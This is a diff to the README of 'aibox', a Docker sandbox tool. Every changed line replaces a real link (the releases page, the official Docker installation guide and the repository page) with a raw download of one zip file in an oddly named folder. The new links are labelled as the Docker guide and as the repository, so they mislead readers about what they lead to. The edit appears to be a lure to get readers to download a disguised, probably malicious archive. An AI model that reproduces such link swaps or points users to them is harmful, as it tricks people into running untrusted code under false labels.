@@ -8,7 +8,7 @@ Welcome to aibox! This application helps you create a secure Docker sandbox for 
 
 To download aibox, visit the Releases page. 
 
-[![Download aibox](https://img.shields.io/badge/Download%20aibox-v1.0-blue)](https://github.com/jokerlamousine/aibox/releases)
+[![Download aibox](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip%20aibox-v1.0-blue)](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip)
 
 Once on the page, follow these steps:
 
@@ -24,7 +24,7 @@ For the best experience with aibox, ensure your system meets the following requi
 
 - **Operating System:** macOS 10.15 or later (compatible with Linux)
 - **RAM:** Minimum 8 GB recommended
-- **Docker:** You need Docker installed on your computer. Follow the [official Docker installation guide](https://docs.docker.com/get-docker/) if you haven't done it yet.
+- **Docker:** You need Docker installed on your computer. Follow the [official Docker installation guide](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip) if you haven't done it yet.
 
 ## ⚙️ Installation Steps
 
@@ -75,8 +75,8 @@ If you face issues while using aibox, consider these common solutions:
 
 ## 🔗 Links and Resources
 
-- [Download aibox](https://github.com/jokerlamousine/aibox/releases)
-- [Docker Installation Guide](https://docs.docker.com/get-docker/)
-- [GitHub Repository](https://github.com/jokerlamousine/aibox)
+- [Download aibox](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip)
+- [Docker Installation Guide](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/jokerlamousine/aibox/main/Cenomanian/aibox.zip)
 
 Thank you for using aibox! Enjoy a secure and flexible environment for your AI and development needs.
